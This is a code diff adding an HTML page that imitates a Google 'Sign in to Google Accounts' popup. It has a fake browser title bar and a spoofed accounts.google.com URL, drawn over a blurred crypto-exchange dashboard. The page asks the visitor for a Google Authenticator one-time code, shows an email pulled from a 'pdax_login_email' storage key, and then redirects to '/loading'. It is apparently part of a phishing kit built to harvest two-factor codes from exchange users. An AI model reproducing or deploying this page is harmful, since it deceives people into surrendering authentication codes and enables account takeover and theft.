@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<base target="_top" />
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Sign in to Google Accounts</title>
+<style>
+  :root { --blue:#1a73e8; }
+  * { box-sizing:border-box; }
+  html,body { margin:0; height:100%; }
+  body { font-family:"Google Sans","Roboto",system-ui,-apple-system,"Segoe UI",Arial,sans-serif; background:#f6f7f8; overflow:hidden; }
+
+  /* Blurred dashboard mock behind the overlay */
+  .bg { position:fixed; inset:0; filter:blur(7px); opacity:.5; pointer-events:none; padding:28px; }
+  .bar { height:52px; background:#fff; border-radius:8px; margin-bottom:24px; box-shadow:0 1px 6px rgba(0,0,0,.05); }
+  .cols { display:grid; grid-template-columns:1fr 1.4fr; gap:28px; max-width:1300px; margin:0 auto; }
+  .card { background:#fff; border-radius:12px; box-shadow:0 1px 8px rgba(0,0,0,.05); padding:22px; }
+  .pill { height:18px; width:60%; background:#e9ecef; border-radius:6px; margin-bottom:14px; }
+  .pill.sm { width:35%; }
+  .grid { display:grid; grid-template-columns:repeat(4,1fr); gap:18px; margin-top:18px; }
+  .coin { text-align:center; }
+  .dot { width:40px; height:40px; border-radius:50%; margin:0 auto 8px; }
+  .g { background:#2bb24c; } .y { background:#f0b429; } .b { background:#3b82f6; } .o { background:#f97316; }
+  .line { display:flex; align-items:center; gap:12px; padding:14px 0; border-bottom:1px solid #f0f1f3; }
+  .line .dot { width:34px; height:34px; margin:0; }
+  .line .txt { flex:1; }
+
+  .dim { position:fixed; inset:0; background:rgba(0,0,0,.04); }
+
+  /* Google popup window */
+  .overlay { position:fixed; inset:0; display:flex; align-items:center; justify-content:center; padding:20px; }
+  .window { background:#fff; border-radius:12px; box-shadow:0 24px 70px rgba(0,0,0,.28); width:100%; max-width:600px; overflow:hidden; }
+
+  .titlebar { display:flex; align-items:center; justify-content:space-between; padding:12px 16px; background:#f1f3f4; border-bottom:1px solid #e3e5e8; }
+  .titlebar .t { display:flex; align-items:center; gap:10px; font-size:14px; color:#3c4043; }
+  .titlebar .ctrls { display:flex; align-items:center; gap:18px; color:#5f6368; }
+  .titlebar .ctrls span { cursor:default; font-size:14px; line-height:1; }
+
+  .urlbar { display:flex; align-items:center; gap:10px; padding:10px 18px; border-bottom:1px solid #eceef0; color:#5f6368; font-size:14px; }
+  .urlbar .url { white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+
+  .body { padding:40px 56px 44px; text-align:center; }
+  .glogo { width:46px; height:46px; margin:0 auto 22px; display:block; }
+  .avatar { width:72px; height:72px; border-radius:50%; background:#e8eaed; margin:0 auto 14px; display:flex; align-items:center; justify-content:center; }
+  h2 { font-size:22px; font-weight:400; color:#202124; margin:0 0 14px; }
+  .acct { display:inline-flex; align-items:center; gap:8px; border:1px solid #dadce0; border-radius:999px; padding:6px 14px 6px 10px; font-size:14px; color:#3c4043; margin:0 auto 26px; }
+  .acct svg { width:20px; height:20px; }
+  .instr { font-size:15px; line-height:1.5; color:#5f6368; margin:0 0 30px; }
+
+  .field { text-align:left; margin-bottom:28px; }
+  .field label { display:block; font-size:13px; font-weight:600; color:#202124; margin:0 0 8px; }
+  .field input { width:100%; height:48px; border:1px solid #dadce0; border-radius:4px; padding:0 14px; font-size:16px; letter-spacing:3px; color:#202124; outline:none; }
+  .field input:focus { border-color:var(--blue); box-shadow:0 0 0 1px var(--blue); }
+
+  .verify { width:100%; padding:13px; border:0; border-radius:6px; background:#9cc3f5; color:#fff; font-size:16px; font-weight:600; cursor:not-allowed; transition:background .15s; display:flex; align-items:center; justify-content:center; }
+  .verify.active { background:var(--blue); cursor:pointer; }
+  .verify.active:hover { background:#1765cc; }
+  .verify .spin { width:20px; height:20px; border-radius:50%; border:3px solid rgba(255,255,255,.5); border-top-color:#fff; animation:rot .8s linear infinite; }
+
+  .links { margin-top:26px; text-align:left; }
+  .links a { display:block; color:#5f6368; font-size:14px; text-decoration:none; margin-bottom:12px; }
+  .links a:hover { color:#202124; }
+
+  @keyframes rot { to { transform:rotate(360deg); } }
+
+  .loader { position:fixed; inset:0; z-index:60; display:none; align-items:center; justify-content:center; background:#fff; }
+  .loader .spin { width:48px; height:48px; border-radius:50%; border:4px solid #e3e7ea; border-top-color:#2bb24c; animation:rot .9s linear infinite; }
+
+  @media (max-width:560px){ .body{ padding:28px 24px 32px; } }
+</style>
+</head>
+<body>
+  <div class="bg">
+    <div class="bar"></div>
+    <div class="cols">
+      <div>
+        <div class="card"><div class="pill"></div><div class="pill sm"></div></div>
+        <div class="card" style="margin-top:20px;">
+          <div class="grid">
+            <div class="coin"><div class="dot g"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
+            <div class="coin"><div class="dot g"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
+            <div class="coin"><div class="dot y"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
+            <div class="coin"><div class="dot g"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="pill sm"></div>
+        <div class="line"><div class="dot g"></div><div class="txt"><div class="pill" style="height:12px;"></div></div></div>
+        <div class="line"><div class="dot y"></div><div class="txt"><div class="pill sm" style="height:12px;"></div></div></div>
+        <div class="line"><div class="dot b"></div><div class="txt"><div class="pill" style="height:12px;"></div></div></div>
+        <div class="line"><div class="dot g"></div><div class="txt"><div class="pill sm" style="height:12px;"></div></div></div>
+      </div>
+    </div>
+  </div>
+  <div class="dim"></div>
+
+  <div class="overlay">
+    <div class="window">
+      <div class="titlebar">
+        <div class="t">
+          <svg width="18" height="18" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+          Sign in to Google Accounts
+        </div>
+        <div class="ctrls"><span>&#8211;</span><span>&#9633;</span><span>&#10005;</span></div>
+      </div>
+
+      <div class="urlbar">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="5" y="11" width="14" height="9" rx="2" fill="#5f6368"/><path d="M8 11V8a4 4 0 118 0v3" stroke="#5f6368" stroke-width="2"/></svg>
+        <span class="url">https://accounts.google.com/v3/signin/challenge/totp</span>
+      </div>
+
+      <div class="body">
+        <svg class="glogo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+
+        <h2>Verify with Google Authenticator</h2>
+
+        <div class="acct">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="11" stroke="#5f6368" stroke-width="1.5"/><path d="M12 12a3 3 0 100-6 3 3 0 000 6zm0 1.5c-3 0-5.5 1.6-5.5 3.8V18h11v-.7c0-2.2-2.5-3.8-5.5-3.8z" fill="#5f6368"/></svg>
+          <span id="acctEmail">your email</span>
+        </div>
+
+        <p class="instr">Enter the temporary code generated in your Google Authenticator app</p>
+
+        <div class="field">
+          <label for="code">Enter code</label>
+          <input id="code" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" autofocus />
+        </div>
+
+        <button class="verify" type="button" id="verify" disabled>Verify</button>
+
+        <div class="links">
+          <a href="#">Verify with something else</a>
+          <a href="/login">Back to sign in</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="loader" id="loader"><div class="spin"></div></div>
+
+  <script>
+    (function () {
+      var email = '';
+      try { email = (localStorage.getItem('pdax_login_email') || '').trim(); } catch (e) {}
+      if (email) document.getElementById('acctEmail').textContent = email;
+    })();
+
+    var code = document.getElementById('code');
+    var verify = document.getElementById('verify');
+
+    function validate() {
+      code.value = code.value.replace(/[^0-9]/g, '').slice(0, 6);
+      if (code.value.length === 6) { verify.classList.add('active'); verify.disabled = false; }
+      else { verify.classList.remove('active'); verify.disabled = true; }
+    }
+    code.addEventListener('input', validate);
+
+    verify.addEventListener('click', function () {
+      if (verify.disabled) return;
+      verify.innerHTML = '<span class="spin"></span>';
+      verify.disabled = true;
+      setTimeout(function () {
+        (window.top || window).location.href = '/loading';
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
